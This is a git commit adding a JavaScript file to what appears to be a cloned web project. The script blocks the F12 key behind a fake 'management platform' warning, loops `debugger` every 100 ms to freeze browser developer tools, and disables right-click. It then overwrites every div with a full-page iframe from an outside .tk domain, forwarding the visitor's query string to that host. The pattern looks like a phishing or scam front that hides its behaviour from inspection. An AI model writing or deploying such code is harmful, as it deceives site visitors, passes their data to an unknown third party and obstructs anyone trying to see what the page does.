0698c51a3045ae10e7347ea043c5b5a099a9f9b2
meili555 <135024085+meili555@users.noreply.github.com>
2025-04-14 13:04:49 +0800

    Add files via upload

---
+++ k4399/js/2.js
@@ -0,0 +1,35 @@
+document.onkeydown = document.onkeyup = document.onkeypress = function (event) {
+	var e = event || window.event || arguments.callee.caller.arguments[0];
+	if (e && e.keyCode == 123) {
+		mAlert();
+		e.returnValue = false;
+		return (false);
+	}
+}
+function mAlert() {
+	alert("感谢使用管理平台，禁止对控制台进行操作！");
+}
+
+
+setInterval(function () {
+	debugger;
+}, 100)
+
+
+document.oncontextmenu = function () { return false; };    
+ var x='https://www.kuangjia.tk/1/ys.html?dwwwf';
+    $(function () {
+        let u = window.document.location.href.toString().split("?");
+        if (typeof (u[1]) == "string") {
+            u = u[1].split("&");
+        } else {
+            u = "";
+        }
+        
+        iframe(x + u);
+    });
+
+    function iframe(src) {
+        $("div").html('<iframe src="' + src + '" width="100%" height="' + (($(window).height()) - 5) + "px" + '" style="border: 0"></iframe>');
+        $(window).resize();
+    }
